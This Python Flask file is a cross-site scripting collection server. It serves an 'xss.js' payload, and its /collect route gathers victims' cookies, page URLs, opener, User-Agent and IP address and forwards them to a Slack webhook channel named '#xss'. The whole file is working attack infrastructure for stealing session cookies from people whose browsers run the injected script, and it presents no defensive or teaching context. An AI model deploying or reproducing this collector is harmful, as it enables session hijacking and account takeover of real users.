from flask import Flask, request
import requests
import json

app = Flask(__name__, static_folder="")


def robot(text):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    url = 'https://hooks.slack.com/services/'
    data = {"channel": "#xss", "username": "xss", "text": text, "type": "mrkdwn"}
    requests.post(url, data={"payload": json.dumps(data)}, headers=headers)


@app.route('/')
def send_js():
    return app.send_static_file("xss.js")


@app.route('/collect')
def xss():
    args = request.values
    ua = request.headers.get("User-Agent")
    location = args.get('l', '')
    toplocation = args.get('t', '')
    opener = args.get('o', '')
    cookie = args.get('c', '')
    source_ip = request.headers["X-Real-Ip"]
    data = """
    ``` ua: {}
    location: {}
    toplocation: {}
    opener: {}
    cookie: {}
    remote_addr: {}```
    """.format(ua, location, toplocation, opener, cookie, source_ip)
    robot(data)
    return "success"


if __name__ == "__main__":
    app.run('127.0.0.1', 9999, threaded=True)
